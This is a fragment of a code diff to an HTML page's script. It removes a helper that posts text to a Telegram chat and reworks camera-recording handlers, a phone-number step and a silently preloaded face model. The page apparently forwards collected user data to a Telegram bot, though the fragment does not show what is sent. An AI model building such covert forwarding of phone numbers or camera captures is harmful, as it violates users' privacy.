-            body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
-          });
-          const json = await res.json();
-          if (json && json.result && json.result.message_id) return json.result.message_id;
-        } catch (e) { console.warn('Telegram send error', e); }
-        return null;
-      })(lines);
-    }
-
-    // helper used earlier (duplicate kept)
-    function escapeHtml(str) { return String(str).replace(/[&<>"']/g, (s) => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[s])); }
-
-    // camera helpers used by recording flow
+    /* Camera helpers */
     async function startCameraForRecording() {
       if (mediaStream) return mediaStream;
       try {
@@ -747,6 +682,7 @@
         return mediaStream;
       } catch (e) {
         console.error('startCamera error', e);
+        showModalError('تعذر الوصول إلى الكاميرا. تأكد من منح الإذن ثم أعد المحاولة.');
         throw e;
       }
     }
@@ -759,23 +695,20 @@
       } catch (e) {}
     }
 
-    // Prevent unload during recording
-    window.addEventListener('beforeunload', (e) => {
-      // not strictly necessary but keep protection
-      if (mediaStream) { e.preventDefault(); e.returnValue = ''; }
-    });
-
-    // recCancel behavior
+    /* Event handlers */
     recCancel.addEventListener('click', () => {
       stopCameraForRecording();
       recOverlay.style.display = 'none';
       recOverlay.setAttribute('aria-hidden','true');
+      topStatus.style.display = 'none';
     });
 
-    // Start app
-    renderPhoneStep();
+    window.addEventListener('beforeunload', (e) => {
+      if (mediaStream) { e.preventDefault(); e.returnValue = ''; }
+    });
 
-    // Preload face model silently
+    /* Start app */
+    renderPhoneStep();
     loadFaceModelSilently().catch(()=>{});
   </script>
 </body>
